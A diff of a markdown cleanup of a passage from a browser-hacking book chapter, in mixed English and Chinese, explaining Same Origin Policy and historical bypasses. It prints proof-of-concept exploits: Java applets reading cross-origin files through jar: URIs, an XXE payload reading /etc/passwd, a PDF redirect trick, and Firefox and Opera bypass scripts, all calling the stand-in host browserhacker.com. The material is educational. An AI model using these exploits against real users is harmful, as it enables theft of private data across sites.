-Actually, it gets more complicated than that. For example, there is an SOP for XMLHttpRequest, DOM access and cookies. There are even separate SOPs for various plugins like Java, Flash and Silverlight, each demonstrating its own quirks and interpretations. When you consider these variances, you can begin to grasp the difficulty a defender has with trying to secure an origin.
+Actually, it gets more complicated than that. For example, there is an SOP for `XMLHttpRequest`, DOM access and cookies. There are even separate SOPs for various plugins like Java, Flash and Silverlight, each demonstrating its own quirks and interpretations. When you consider these variances, you can begin to grasp the difficulty a defender has with trying to secure an origin.
 
-If that wasn’t enough, there are legitimate reasons for web applications to communicate to different origins. Some of these cross-origin communication techniques were explored in Chapter 3, including XHR polling, the WebSocket protocol, window.postMessage() functions and DNS channels. The following sections will explore some more examples of techniques web applications use to communicate cross-origin.
+If that wasn’t enough, there are legitimate reasons for web applications to communicate to different origins. Some of these cross-origin communication techniques were explored in Chapter 3, including XHR polling, the WebSocket protocol, `window.postMessage()` functions and DNS channels. The following sections will explore some more examples of techniques web applications use to communicate cross-origin.
 
 ## Understanding the SOP with the DOM
 
 When determining how JavaScript and other protocols can access DOM policies, there are three portions of the URL that are compared to determine access — the hostname, the scheme and the port. If two sites contain the same hostname, scheme and port when accessed, then DOM access is granted. The only exception (for DOM access) is Internet Explorer; it only validates hostname and scheme before determining access.
 
-This works well when all scripting is under one origin. However in many cases, there may be another host within the same root domain, which should have access to the source page’s DOM. One example might be a series of sites that use a central authentication server. For instance, store.browservictim.com may need to leverage authentication through login.browservictim.com.
+This works well when all scripting is under one origin. However in many cases, there may be another host within the same root domain, which should have access to the source page’s DOM. One example might be a series of sites that use a central authentication server. For instance, `store.browservictim.com` may need to leverage authentication through `login.browservictim.com`.
 
-In this case, the sites can use the document.domain property to allow other sites within the same domain to interact with the DOM. To allow the code from login.browservictim.com to interact with the forms on store.browservictim.com the developer would need to set the document.domain property to the root of the domain (on both sites):
+In this case, the sites can use the `document.domain` property to allow other sites within the same domain to interact with the DOM. To allow the code from `login.browservictim.com` to interact with the forms on `store.browservictim.com` the developer would need to set the `document.domain` property to the root of the domain (on both sites):
 
 ```
 document.domain = "browservictim.com"
 ```
 
-Once this is set in the DOM, the SOP is relaxed to the root of the domain. This means that anything in the browservictim.com domain can access the DOM in the current page. There are a few restrictions to setting these values, however. Once the SOP is relaxed down to the root domain, it can’t be restricted again.
+Once this is set in the DOM, the SOP is relaxed to the root of the domain. This means that anything in the `browservictim.com` domain can access the DOM in the current page. There are a few restrictions to setting these values, however. Once the SOP is relaxed down to the root domain, it can’t be restricted again.
 
-To see this in action, you can try setting the document.domain property to the root of the domain. Then, try to restrict it again. Opening the SOP to include the root domain will be allowed, however when trying to set it back, an error will be generated:
+To see this in action, you can try setting the `document.domain` property to the root of the domain. Then, try to restrict it again. Opening the SOP to include the root domain will be allowed, however when trying to set it back, an error will be generated:
 
 ```
 // current domain: store.browservictim.com
@@ -2862,15 +2790,13 @@ document.domain = "browservictim.com"; // Ok
 document.domain = "store.browservictim.com"; // Error
 ```
 
-
-
 在放松 SOP 之前，确保开发人员理解所有影响是很重要的。如果这是生产环境，且有人在 Internet 上放置了 `wikidev.browservictim.com`，则该新站点中的弱点可能对 `store.browservictim.com` 的来源构成风险。如果攻击者能够由于未修补的弱点上传恶意代码，那么 wikidev 站点将拥有与登录站点相同的访问权限。这可能会暴露信息，或导致 XSS、XSRF 或其他类型的攻击。
 
 ## 理解 SOP 与 CORS
 
-默认情况下，如果你使用 XMLHttpRequest 对象 (XHR) 向不同源发送请求，你无法读取响应。但请求仍然会到达目的地。这是跨源请求的一个非常有用的特性，将在第 9 章和第 10 章中作为多种攻击技术的一部分进行讨论。
+默认情况下，如果你使用 `XMLHttpRequest` 对象 (`XHR`) 向不同源发送请求，你无法读取响应。但请求仍然会到达目的地。这是跨源请求的一个非常有用的特性，将在第 9 章和第 10 章中作为多种攻击技术的一部分进行讨论。
 
-SOP 防止你读取 HTTP 响应头或体。放松 SOP 并允许 XHR 跨源通信的一种方法是使用 Cross-origin Resource Sharing (CORS)。如果浏览器 hacker.com 源返回以下响应头，则 browservictim.com 的所有子域都可以与 browserhacker.com 建立双向通信通道：
+SOP 防止你读取 HTTP 响应头或体。放松 SOP 并允许 XHR 跨源通信的一种方法是使用 Cross-origin Resource Sharing (`CORS`)。如果浏览器 `browserhacker.com` 源返回以下响应头，则 `browservictim.com` 的所有子域都可以与 `browserhacker.com` 建立双向通信通道：
 
 ```
 Access-Control-Allow-Origin: \*.browservictim.com
@@ -2879,7 +2805,7 @@ Access-Control-Allow-Headers: X-custom
 Access-Control-Allow-Credentials: true
 ```
 
-除了第一个自解释的 HTTP 响应头外，其他头指示请求可以使用 OPTIONS、GET 或 POST 等任何方法，并最终包括 X-custom 头。请注意 Access-Control-Allow-Credentials 头，它负责允许对资源进行经过身份验证的通信。下面的代码片段演示了这一点：
+除了第一个自解释的 HTTP 响应头外，其他头指示请求可以使用 OPTIONS、GET 或 POST 等任何方法，并最终包括 X-custom 头。请注意 `Access-Control-Allow-Credentials` 头，它负责允许对资源进行经过身份验证的通信。下面的代码片段演示了这一点：
 
 ```
 var url = 'http://browserhacker.com/authenticated/user';
@@ -2890,17 +2816,17 @@ xhr.onreadystatechange = do_something();
 xhr.send();
 ```
 
-前面的示例检索 /authenticated/user 资源。在此情况下，访问需要凭证。通过将 withCredentials 标志设置为 true，JavaScript 启用了身份验证支持。
+前面的示例检索 `/authenticated/user` 资源。在此情况下，访问需要凭证。通过将 `withCredentials` 标志设置为 true，JavaScript 启用了身份验证支持。
 
 ## 理解 SOP 与插件
 
-理论上，如果插件从 http://browserhacker.com:80/ 服务，它应该只能访问 http://browserhacker.com:80/。但实际上并非如此。正如本章后面所学到的，Java、Adobe Reader、Adobe Flash 和 Silverlight 等许多 SOP 实现都不一致，并且在过去曾遭受过各种绕过。
+理论上，如果插件从 `http://browserhacker.com:80/` 服务，它应该只能访问 `http://browserhacker.com:80/`。但实际上并非如此。正如本章后面所学到的，Java、Adobe Reader、Adobe Flash 和 Silverlight 等许多 SOP 实现都不一致，并且在过去曾遭受过各种绕过。
 
 每个主流浏览器插件都按自己的方式实现 SOP。例如，某些 Java 版本认为两个不同域名在 IP 相同的情况下被视为同源。这在虚拟主机环境中可能产生毁灭性后果，因为这些环境通常会在同一 IP 地址上托管多个网站。
 
 Adobe 拥有 PDF 阅读器和 Flash 插件中长期存在的关键安全漏洞。大多数这些漏洞允许执行任意代码，因此安全风险远高于 SOP 绕过。然而，SOP 绕过也影响了这些插件。
 
-Adobe Flash 提供一种方法让你管理跨源通信。这是通过名为 crossdomain.xml 的文件实现的，该文件应位于网站根目录。文件内容类似于以下内容：
+Adobe Flash 提供一种方法让你管理跨源通信。这是通过名为 `crossdomain.xml` 的文件实现的，该文件应位于网站根目录。文件内容类似于以下内容：
 
 ```
 <?xml version="1.0"?>
@@ -2910,9 +2836,9 @@ Adobe Flash 提供一种方法让你管理跨源通信。这是通过名为 cros
   </cross-domain-policy>
 ```
 
-通过这种策略，browserhacker.com 的每个子域都可以与应用实现双向通信。
+通过这种策略，`browserhacker.com` 的每个子域都可以与应用实现双向通信。
 
-Java 和 Silverlight 的 SOP 可以通过类似的方式放松，因为 crossdomain.xml 同时被这两个插件支持。Silverlight 还支持 clientaccess-policy.xml。当发出跨源请求时，Silverlight 首先检查该文件，如果找不到则回退到 crossdomain.xml。这两个插件都有其特殊之处，如下面的章节所示。
+Java 和 Silverlight 的 SOP 可以通过类似的方式放松，因为 `crossdomain.xml` 同时被这两个插件支持。Silverlight 还支持 `clientaccess-policy.xml`。当发出跨源请求时，Silverlight 首先检查该文件，如果找不到则回退到 `crossdomain.xml`。这两个插件都有其特殊之处，如下面的章节所示。
 
 ## 理解 SOP 与 UI Redressing
 
@@ -2924,7 +2850,9 @@ UI redressing 攻击以不同方式绕过 SOP。一些已修复的攻击（现�
 
 检索浏览器历史记录可能对用户隐私造成严重破坏。虽然大多数针对用户隐私的攻击在第 5 章中已有所涉及，但本章也包含一些浏览器历史记录攻击的示例。
 
-这些攻击中的一些依赖于经典的 SOP 实现缺陷，例如 http 方案能够访问其他方案（例如 browser、about 或 mx）。这些攻击在 Avant 和 Maxthon 这两个不太知名但在中国非常流行的浏览器上曾经有效。
+
+
+这些攻击中的一些依赖于经典的 SOP 实现缺陷，例如 `http` 方案能够访问其他方案（例如 `browser`、`about` 或 `mx`）。这些攻击在 Avant 和 Maxthon 这两个不太知名但在中国非常流行的浏览器上曾经有效。
 
 更为高级的攻击手段涉及在加载跨源资源时捕获 SOP 违规错误。这些攻击有助于揭示浏览器之前访问过的站点。
 
@@ -2938,11 +2866,11 @@ SOP 的解释因所有开发者而异。这种复杂性和各种解释将在攻�
 
 ### 绕过 SOP 的 Java
 
-Java 版本 1.7u17 和 1.6u45 在两个域名解析到相同 IP 时不强制执行 SOP。也就是说，如果 browserhacker.com 和 browservictim.com 解析到相同 IP，Java Applet 就可以发起跨源请求并读取响应。
+Java 版本 1.7u17 和 1.6u45 在两个域名解析到相同 IP 时不强制执行 SOP。也就是说，如果 `browserhacker.com` 和 `browservictim.com` 解析到相同 IP，Java Applet 就可以发起跨源请求并读取响应。
 
-根据 Java 6 和 7 文档，特别是 URL 类的 equals 方法，可知：“如果两个主机名称可以解析为相同的 IP 地址，则两个主机被视为相等[…]”。显然，这是 Java SOP 实现的漏洞（当时未修补）。该漏洞在虚拟主机环境中尤为严重，因为在该环境中，可能有数百个域名由同一服务器管理并解析到相同 IP。
+根据 Java 6 和 7 文档，特别是 `URL` 类的 `equals` 方法，可知：“如果两个主机名称可以解析为相同的 IP 地址，则两个主机被视为相等[…]”。显然，这是 Java SOP 实现的漏洞（当时未修补）。该漏洞在虚拟主机环境中尤为严重，因为在该环境中，可能有数百个域名由同一服务器管理并解析到相同 IP。
 
-考虑以下场景，其中 www.browservictim.com 和 www.browserhacker.com 都解析到 IP 地址 192.168.0.2：
+考虑以下场景，其中 `www.browservictim.com` 和 `www.browserhacker.com` 都解析到 IP 地址 `192.168.0.2`：
 
 ```
 $ cat /etc/hosts/
@@ -2950,9 +2878,7 @@ $ cat /etc/hosts/
 192.168.0.2     www.browserhacker.com
 ```
 
-
-
-在下面的 Java 小程序中，当调用 getInfo() 方法时，它会创建一个 `java.net.URL` 对象的新实例，用于从 `www.browserhacker.com` 上托管的特定 URL 获取内容：
+在下面的 Java 小程序中，当调用 `getInfo()` 方法时，它会创建一个 `java.net.URL` 对象的新实例，用于从 `www.browserhacker.com` 上托管的特定 URL 获取内容：
 
 ```java
 import java.applet.*;
@@ -3020,23 +2946,23 @@ setTimeout(function(){getInfo();},5000);
 </html>
 ```
 
-在图 4-1 中的弹出框里，你可以看到从 www.browservictim.com 正确获取 demos/secret_page.html 内容，而 Java 不认为这是不同的来源。
+在图 4-1 中的弹出框里，你可以看到从 `www.browservictim.com` 正确获取 `demos/secret_page.html` 内容，而 Java 不认为这是不同的来源。
 
-start figure 
+start figure
 
 **Figure 4-1:** Unsigned applet is able to retrieve content cross-origin.
 
 ![c04f001.tif](img/c04f001.png)
 
-end figure 
+end figure
 
-一个重要的考虑因素是小程序使用 URL、BufferedReader 和 InputStreamReader 对象所需的权限。在 Java 1.6 中，正常的未签名小程序即可，无需用户干预（除了最新的浏览器版本，其中所有未签名小程序都需要用户干预才能运行）。在 Java 1.7 中，小程序需要显式的用户权限才能运行，这导致必须点击“运行”按钮来接受其执行。
+一个重要的考虑因素是小程序使用 `URL`、`BufferedReader` 和 `InputStreamReader` 对象所需的权限。在 Java 1.6 中，正常的未签名小程序即可，无需用户干预（除了最新的浏览器版本，其中所有未签名小程序都需要用户干预才能运行）。在 Java 1.7 中，小程序需要显式的用户权限才能运行，这导致必须点击“运行”按钮来接受其执行。
 
 这归功于 Oracle 在 2013 年早期的 Java 1.7 更新 11 中实现的小程序递送机制的变更。现在，用户必须显式使用“Click to Play”功能来运行已签名和未签名的小程序。该功能的最初实现被 Immunity2 绕过，随后 Oracle 发布了补丁。此外，从 Java 7u21 开始，Oracle 更新了“Click to Play”安全对话框，根据小程序类型区分显示给用户的信息。
 
 尽管如此，从最终用户的角度来看，两个在 Java 版本大于 7u21 的已签名小程序之间的区别在于一个词。如果已签名小程序请求运行在沙箱之外，显示给用户的信息将是“…will run with unrestricted access …”。如果已签名小程序是沙箱化的，显示的信息将是“…will run with restricted access …”。你可以清晰地看到这两条信息之间的细微差别。关键问题是有多少用户会注意到这种差别？不过，“Click to Play”实际上消除了 Java 作为悄悄绕过同源策略（SOP）的选项。
 
-Mario Heiderich 发现，当 Firefox 中 LiveConnect5 API 和 Java 插件可用时，会出现一个 Java 奇特之处。LiveConnect 使得 Firefox 15 及更早版本的 Packages DOM 对象可用。该对象允许你直接在 DOM 中调用 Java 对象和方法。下面的示例展示了使用 Packages DOM 对象进行绕过的方法：
+Mario Heiderich 发现，当 Firefox 中 LiveConnect5 API 和 Java 插件可用时，会出现一个 Java 奇特之处。LiveConnect 使得 Firefox 15 及更早版本的 `Packages` DOM 对象可用。该对象允许你直接在 DOM 中调用 Java 对象和方法。下面的示例展示了使用 `Packages` DOM 对象进行绕过的方法：
 
 ```javascript
 <script>
@@ -3051,9 +2977,9 @@ alert(data)
 </script>
 ```
 
-当使用 Packages 来调用这段 Java 代码时，会产生一个潜在危险的副作用。如果代码在 Java 1.7 与 Firefox 15 或更早版本中执行，则前面讨论的“Click to Play”功能完全被绕过。如果浏览器是 Firefox 并且启用了 LiveConnect API，这种静默行为极大地提高了 Java 小程序用于 SOP 绕过的实用性。
+当使用 `Packages` 来调用这段 Java 代码时，会产生一个潜在危险的副作用。如果代码在 Java 1.7 与 Firefox 15 或更早版本中执行，则前面讨论的“Click to Play”功能完全被绕过。如果浏览器是 Firefox 并且启用了 LiveConnect API，这种静默行为极大地提高了 Java 小程序用于 SOP 绕过的实用性。
 
-另一个有趣的 Java SOP 绕过漏洞是 CVE-2011-3546，它在 2011 年底经过十个月的修复。类似的 SOP 绕过也在 Adobe Reader 中被发现，将在下一节讨论。Neal Poole 发现，如果用于加载小程序的资源返回 301 或 302 重定向，小程序的来源被评估为重定向的来源，而不是目的地。考虑以下代码：
+另一个有趣的 Java SOP 绕过漏洞是 `CVE-2011-3546`，它在 2011 年底经过十个月的修复。类似的 SOP 绕过也在 Adobe Reader 中被发现，将在下一节讨论。Neal Poole 发现，如果用于加载小程序的资源返回 301 或 302 重定向，小程序的来源被评估为重定向的来源，而不是目的地。考虑以下代码：
 
 ```html
 <applet
@@ -3063,45 +2989,47 @@ http://browserhacker.com/malicious.jar"
 width="100" height="100"></applet> 
 ```
 
-你理所当然地期望如果小程序尝试访问 browservictim.com 时，同源策略会被强制执行。当然，在这种情况下应该抛出 SOP 违规错误。这正是一个非缺陷的 SOP 实现应该表现的方式，因为小程序的来源是 browserhacker.com。相反，Java 版本 1.7 和 1.6 update 27（以及更早版本）将重定向的来源视为有效的来源。实际上，这意味着你可以读取受开放重定向漏洞影响的所有来源的内容。小程序会从重定向目的地（受攻击方控制的网站）加载，而重定向来源是受害者的来源（易受开放重定向影响）。
+你理所当然地期望如果小程序尝试访问 `browservictim.com` 时，同源策略会被强制执行。当然，在这种情况下应该抛出 SOP 违规错误。这正是一个非缺陷的 SOP 实现应该表现的方式，因为小程序的来源是 `browserhacker.com`。相反，Java 版本 1.7 和 1.6 update 27（以及更早版本）将重定向的来源视为有效的来源。实际上，这意味着你可以读取受开放重定向漏洞影响的所有来源的内容。小程序会从重定向目的地（受攻击方控制的网站）加载，而重定向来源是受害者的来源（易受开放重定向影响）。
 
-Frederik Braun7 发现了另一个在 Java 版本 1.7 Update 5 及更早版本中的有趣的 SOP 绕过漏洞，Oracle 随后在 Java 1.7 Update 9 中修复了该漏洞。该绕过利用了 Java 的 URL 对象（前面示例中也使用了该对象），该对象黑名单了使用 ftp 和 file URI 方案进行跨来源请求。尽管 jar 方案被允许，这使得你可以创建一个完全有效的 URI，例如：
+Frederik Braun7 发现了另一个在 Java 版本 1.7 Update 5 及更早版本中的有趣的 SOP 绕过漏洞，Oracle 随后在 Java 1.7 Update 9 中修复了该漏洞。该绕过利用了 Java 的 `URL` 对象（前面示例中也使用了该对象），该对象黑名单了使用 `ftp` 和 `file` URI 方案进行跨来源请求。尽管 `jar` 方案被允许，这使得你可以创建一个完全有效的 URI，例如：
 
 ```
 jar:http://browserhacker.com/secret.jar
 ```
 
-这些 jar URI 可以在创建新的 URL 对象时使用。在这种情况下，同源策略没有得到强制执行，因此从 browserhacker.com 的未签名 Java 小程序可以请求不同来源的 JAR 文件，从而读取其内容。
+这些 `jar` URI 可以在创建新的 `URL` 对象时使用。在这种情况下，同源策略没有得到强制执行，因此从 `browserhacker.com` 的未签名 Java 小程序可以请求不同来源的 JAR 文件，从而读取其内容。
 
-这种 SOP 绕过的影响不仅仅局限于 JAR 文件。JAR 格式本质上是带有 Manifest 和 META-INF 目录的 ZIP 文件。Microsoft Office 和 Open Office 文档格式也是同样的结构，这意味着你可以使用这种 SOP 绕过来读取任何 docx、odt、jar 以及本质上基于 zip 格式的任何压缩文件。
+这种 SOP 绕过的影响不仅仅局限于 JAR 文件。JAR 格式本质上是带有 `Manifest` 和 `META-INF` 目录的 ZIP 文件。Microsoft Office 和 Open Office 文档格式也是同样的结构，这意味着你可以使用这种 SOP 绕过来读取任何 `docx`、`odt`、`jar` 以及本质上基于 `zip` 格式的任何压缩文件。
 
 下面的代码可以用于通过前面讨论的 SOP 绕过方法读取 Open Office 文档的内容：
 
-``` 
-```
+```java
+import java.awt.*;
+import java.applet.Applet ;
 
+import java.io.* ;
+import java.net.*;
 
+public class zipSopBypass extends Applet {
 
-import java.awt.*; import java.applet.Applet ; 
-import java.io.* ; import java.net.*;
+ private TextArea ltArea = new TextArea("", 100, 300); 
 
-public class `zipSopBypass` extends `Applet` {
- private `TextArea` `ltArea` = new `TextArea`("", 100, 300); 
- public void `init` (){ 
-   add(`ltArea`);
+ public void init (){ 
+   add(ltArea);
  }
 
- public void `paint` (`Graphics` g) {
+ public void paint (Graphics g) {
   g.drawString("Reading file content in JAR...", 80, 80);
+
   // the applet is loaded from 
-  //the http://browserhacker.com origin
+  // the http://browserhacker.com origin
   String url = "jar:https://browservictim.com/"+
    "stuff/confidential.odt!/content.xml"; 
   String content = ""; 
   try{
-   `URL` u = new `URL`(url);
-   `BufferedReader` ff = new `BufferedReader`(
-     new `InputStreamReader`(u.openStream())
+   URL u = new URL(url);
+   BufferedReader ff = new BufferedReader(
+     new InputStreamReader(u.openStream())
    );
    while (ff.ready()){ 
      content += ff.readLine(); 
@@ -3109,25 +3037,27 @@ public class `zipSopBypass` extends `Applet` {
   }catch(Exception e){ 
     g.drawString( "Error",100,100); 
   }
-
-  `ltArea`.setText(content); 
+  ltArea.setText(content); 
   g.drawString(content ,100,100); 
 }
 }
+```
 
-Note that the url variable from the previous code is pointing to the content.xml resource contained inside the odt file archive. In Open Office documents, every file contains a content.xml resource.
+Note that the `url` variable from the previous code is pointing to the `content.xml` resource contained inside the `odt` file archive. In Open Office documents, every file contains a `content.xml` resource.
 
 Almost all the Java SOP bypasses described in the previous pages have been patched by Oracle. However, according to security companies like WebSense8 and Bit9,9 the majority of enterprises still use old and vulnerable versions of Java. Around July 2013, Bit9 collected Java usage statistics from almost 400 organizations using Bit9’s software reputation service. In total, approximately 1 million enterprise endpoint systems were surveyed. About 80 percent of those systems used Java 6. In those environments, it was still possible to run unsigned applets without user intervention.
 
 The Click to Play security control has been introduced in the latest browsers and in Java itself. You may expect this to stop your ability to employ Java applets in your browser hacking. In fact, although it will slow you down, it won’t necessarily stop you. Don’t forget Internet Explorer 9 and below does not implement Click to Play. Also, according to the Bit9 survey, 93 percent of organizations had multiple versions of Java installed on the same machine. This means there is still plenty of opportunity to use Java during your browser hacking. With systems having multiple versions of Java, you can target the older versions and target browsers that don’t employ the Click to Play control.
 
- start figure 
+start figure
 
 **Figure 4-2:** Java security bug time line from 2012 to mid-2013.
 
 ![c04f002.tif](img/c04f002.png)
 
- end figure 
+end figure
+
+
 
 The widespread presence of the Java plugin makes it a perfect target for attackers. Eric Romang summarized a time line of Java zero days that led to arbitrary code execution, as displayed in Figure 4-2.10 Whilst these are not SOP bypasses, the time line is suggestive of what you can expect in the future.
 
@@ -3137,7 +3067,7 @@ Adobe Reader is infamous for the number of security bugs that have been found in
 
 As you may know, the Adobe Reader PDF parser understands JavaScript.12 This attribute is often used by malware to hide malicious code inside PDFs.
 
-One of these flaws that allowed for the bypassing of the SOP is CVE-2013-0622, discovered by Billy Rios, Federico Lanusse, and Mauro Gentile. The attack (now patched in Adobe Reader versions greater than 11.0.0) was similar to the second SOP bypass discussed previously in the Java section, where exploiting an open redirect would allow a foreign origin to access the origin of the redirect. Similar to this attack, a request that returns a 302 redirect response code is used to exploit the vulnerability. Another interesting aspect of the bug is that the SOP was not enforced when specifying a resource using an XML External Entity (XXE).
+One of these flaws that allowed for the bypassing of the SOP is `CVE-2013-0622`, discovered by Billy Rios, Federico Lanusse, and Mauro Gentile. The attack (now patched in Adobe Reader versions greater than 11.0.0) was similar to the second SOP bypass discussed previously in the Java section, where exploiting an open redirect would allow a foreign origin to access the origin of the redirect. Similar to this attack, a request that returns a 302 redirect response code is used to exploit the vulnerability. Another interesting aspect of the bug is that the SOP was not enforced when specifying a resource using an XML External Entity (XXE).
 
 Conventional XXE injection involves trying to inject malicious payloads into requests that accept XML input, such as the following:
 
@@ -3147,7 +3077,7 @@ Conventional XXE injection involves trying to inject malicious payloads into req
 <!ENTITY xxe SYSTEM "/etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-If the XML parser allows external entities, the value of &xxe, is then replaced with the contents of /etc/passwd. The same technique can be used to bypass the SOP. It involves loading (as an external entity) the resource and the server replying with a 302 redirect. The real resource you want to retrieve is the target of the redirection. Consider the following JavaScript code snippet, which is contained in a PDF file:
+If the XML parser allows external entities, the value of `&xxe;`, is then replaced with the contents of `/etc/passwd`. The same technique can be used to bypass the SOP. It involves loading (as an external entity) the resource and the server replying with a 302 redirect. The real resource you want to retrieve is the target of the redirection. Consider the following JavaScript code snippet, which is contained in a PDF file:
 
 ```
 var xml="<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
@@ -3159,13 +3089,11 @@ var xdoc = XMLData.parse(xml,false);
 app.alert(escape(xdoc.foo.value));
 ```
 
-When the PDF is loaded, the preceding JavaScript code is executed. A GET request is sent to browserhacker.com, which replies with an HTTP 302 response, redirecting to the value of the redirect parameter. This results in document.txt (from browservictim.com) being retrieved and parsed.
+When the PDF is loaded, the preceding JavaScript code is executed. A GET request is sent to `browserhacker.com`, which replies with an HTTP 302 response, redirecting to the value of the `redirect` parameter. This results in `document.txt` (from `browservictim.com`) being retrieved and parsed.
 
-The origin of http://browserhacker.com should not have access to content in the http://browservictim.com origin. This is clearly a security flaw of the Adobe Reader SOP implementation, because only resources from the same-origin where the PDF was loaded from should be read. In this case, you’re reading a resource from a different origin than the one where the PDF was loaded. Exploiting this bug has a limitation, though, which can be generally applied to XXE injection bugs. The resource to be retrieved needs to be either a plain or XML document type; otherwise, the XML parser will throw an error.
+The origin of `http://browserhacker.com` should not have access to content in the `http://browservictim.com` origin. This is clearly a security flaw of the Adobe Reader SOP implementation, because only resources from the same-origin where the PDF was loaded from should be read. In this case, you’re reading a resource from a different origin than the one where the PDF was loaded. Exploiting this bug has a limitation, though, which can be generally applied to XXE injection bugs. The resource to be retrieved needs to be either a plain or XML document type; otherwise, the XML parser will throw an error.
 
-
-
--   引入了一个重要问题，因为它创建了从 HTTP 到 HTTPS 的桥梁。如果你能通过 HTTP 传入恶意内容，它将能够访问（可能包含敏感信息的）通过 HTTPS 保护的内容。
+- 引入了一个重要问题，因为它创建了从 HTTP 到 HTTPS 的桥梁。如果你能通过 HTTP 传入恶意内容，它将能够访问（可能包含敏感信息的）通过 HTTPS 保护的内容。
 
 ## 绕过 Internet Explorer 的 SOP
 
@@ -3173,12 +3101,12 @@ Internet Explorer 也并未能幸免于 SOP 绕过的困扰。一个例子是 In
 
 下面的代码片段演示了该漏洞：
 
-``` 
+```
 var document; 
 document = {}; 
 document.domain = 'browserhacker.com'; 
 alert(document.domain);
-``` 
+```
 
 如果你在最新的浏览器中运行这段代码，你会在 JavaScript 控制台中看到 SOP 违规错误。但它在旧版本的 Internet Explorer 中会正常工作。通过利用这段代码作为 XSS 的一部分，你可以打开 SOP，从而与其他来源建立双向通信。
 
@@ -3224,7 +3152,7 @@ end figure
 
 2012 年 10 月，Gareth Heyes 发现了 Firefox 中一个更有趣的 SOP 绕过漏洞 17。该漏洞非常严重，以至于 Mozilla 决定在修复之前暂停 Firefox 16 的下载，直到问题解决 18。如前所述，之前的版本未受影响，因此可以推测该漏洞是作为升级的一部分引入的，但在 Firefox 16 的回归测试中未被发现。该漏洞导致未经授权访问 `window.location` 对象，超出了 SOP 的限制。以下是 Heyes 提供的原始 Proof of Concept (PoC)：
 
-``` 
+```
 <!doctype html>
 <script>
 function poc() {
@@ -3238,7 +3166,8 @@ function poc() {
 </script>
 <input type=button value="Firefox knows" onclick="poc()">
 ```
-如果你在受控的来源（例如 browserhacker.com）执行上述代码，同时在另一个标签中登录 Twitter，将触发该攻击。它会打开一个新窗口加载 https://twitter.com/lists，Twitter 会自动跳转到 https://twitter.com/<user_uid>/lists（其中 user_id 是你的 Twitter 处理名）。5 秒后，`exec` 函数会触发 `window.location` 对象的解析（这里是漏洞所在，因为它不应该跨来源访问），从而显示 Twitter 处理名在弹窗中。
+
+如果你在受控的来源（例如 `browserhacker.com`) 执行上述代码，同时在另一个标签中登录 Twitter，将触发该攻击。它会打开一个新窗口加载 `https://twitter.com/lists`，Twitter 会自动跳转到 `https://twitter.com/<user_uid>/lists`（其中 `user_id` 是你的 Twitter 处理名）。5 秒后，`exec` 函数会触发 `window.location` 对象的解析（这里是漏洞所在，因为它不应该跨来源访问），从而显示 Twitter 处理名在弹窗中。
 
 start feature 
 
@@ -3275,7 +3204,7 @@ if(top != window) { top.location = window.location; }
 
 如果你查看 Opera 稳定版 12.10 的变更日志 19，会发现多个安全漏洞修复。其中一个补丁 20 是 Heyes 发现的 SOP 绕过漏洞。该漏洞利用了 Opera 在重写 IFrame 位置对象构造函数原型时未能正确执行 SOP。请参考以下代码：
 
-``` 
+```
 <html>
 <body>
 <iframe id="ifr" src="http://browservictim.com/xdomain.html"></iframe>
@@ -3295,7 +3224,7 @@ setTimeout("do_something()",3000);
 
 下面是来自不同来源的框架内容：
 
-``` 
+```
 <html>
 <body>
 <b>I will be framed from a different origin</b>
@@ -3315,9 +3244,9 @@ setTimeout("do_join();", 5000);
 
 
 
--   [框架代码](https://browserhacker.com)正在向控制台打印 `\[\].constructor.prototype.join` 的值，这是调用 `join()` 方法时数组使用的原生代码。5 秒后，`join()` 方法会在 `[1,2,3]` 数组上被调用，之前使用的打印函数会再次被调用。第二次输出显示了原型被覆盖后的差异。如果回顾第一个代码片段，可以看到 `join()` 原型在 `do_something()` 函数内部被覆盖。
+- [框架代码](https://browserhacker.com)正在向控制台打印 `[].constructor.prototype.join` 的值，这是调用 `join()` 方法时数组使用的原生代码。5 秒后，`join()` 方法会在 `[1,2,3]` 数组上被调用，之前使用的打印函数会再次被调用。第二次输出显示了原型被覆盖后的差异。如果回顾第一个代码片段，可以看到 `join()` 原型在 `do_something()` 函数内部被覆盖。
 
-``` 
+```
 iframe.contentWindow.location.constructor.
 prototype.__defineGetter__.constructor('[].constructor.
 prototype.join=function(){console.log("pwned")}')();
@@ -3325,23 +3254,15 @@ prototype.join=function(){console.log("pwned")}')();
 
 请注意，可以在不触发 SOP 违规错误的情况下调用 `iframe.contentWindow.location.constructor`。这是一种错误行为，因为 SOP 应该被强制执行。例如，Chrome 会抛出 SOP 违规错误，如 Figure 4-4 所示。
 
-start figure 
-
 **Figure 4-4:** Chrome SOP 违规错误，当尝试访问构造函数时
 
 ![c04f004.tif](img/c04f004.png)
 
-end figure 
-
 进一步来说，你想验证在原型覆盖后是否可以执行代码。在 Figure 4-5 中，你可以看到可以执行代码，例如 `return 5+20`，但可用的操作受限。即使 `alert()` 函数也无法使用，会产生安全错误。
-
-start figure 
 
 **Figure 4-5:** 尝试执行受限操作时的安全错误
 
 ![c04f005.tif](img/c04f005.png)
-
-end figure 
 
 Heyes 还发现了通过覆盖字面量来绕过 SOP 的方法，这些方法未被 Opera 过滤。使用 `[]` 的数组字面量，并对 `join()` 方法进行原型覆盖，即可在框架内容每次调用数组的 `join()` 方法时执行任意代码：
 
@@ -3351,13 +3272,9 @@ Heyes 还发现了通过覆盖字面量来绕过 SOP 的方法，这些方法未
 
 为了演示 SOP 绕过的效果，从 [`browserhacker.com`](https://browserhacker.com) 获取代码，然后在两个不同来源上托管这两个代码片段，并在 Opera 12.02 控制台中打开。控制台输出将与 Figure 4-6 相同。
 
-start figure 
-
 **Figure 4-6:** 在 Opera 中覆盖 `join()` 函数
 
 ![c04f006.tif](img/c04f006.png)
-
-end figure 
 
 使用此绕过的前提是：只能针对可框架的网站。因此，使用 `X-Frame-Options` 或防止框架的源不在该 SOP 绕过的范围内。另一个需要提及的考虑因素是，你可以使用字面量覆盖任何原型，而不仅仅是 `Array.join()` 方法。例如，你可以覆盖 `toString()` 方法：
 
@@ -3367,11 +3284,11 @@ end figure
 
 在真实攻击中，你可能会框架一个资源，可能是已存储会话 cookie 的已认证资源，并使用此 SOP 绕过来读取框架资源的内容。框架资源通常包含用户的私有数据，因为有效的会话 cookie 在加载资源时已被使用。
 
